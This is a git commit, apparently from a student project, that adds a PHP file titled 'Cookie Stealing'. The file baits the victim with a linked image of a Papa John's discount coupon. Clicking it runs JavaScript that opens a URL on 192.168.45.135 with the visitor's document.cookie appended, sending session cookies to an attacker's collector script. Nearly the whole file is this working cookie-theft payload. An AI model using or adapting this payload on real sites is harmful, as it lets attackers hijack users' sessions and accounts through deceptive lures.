e96dd47002eba8f175d41d1913a57bc9284bd32e
Vishal Chhatwani <vchha001@fiu.edu>
2016-12-28 19:36:09 -0500

    Add files via upload

---
+++ Cookie stealing project/Cookie stealing.php
@@ -0,0 +1,12 @@
+--->> Cookie Stealing 
+
+
+<a href="javascript:steal()"><img src="https://professionalsaver.files.wordpress.com/2012/06/papa-johns-50-off1.png" width="250" height="200"/></a>
+<script>
+
+function steal(){
+
+	window.open("http://192.168.45.135/papaJohn/usercookie.php?cookie=" %2B document.cookie,"_blank");
+}
+</script>
+
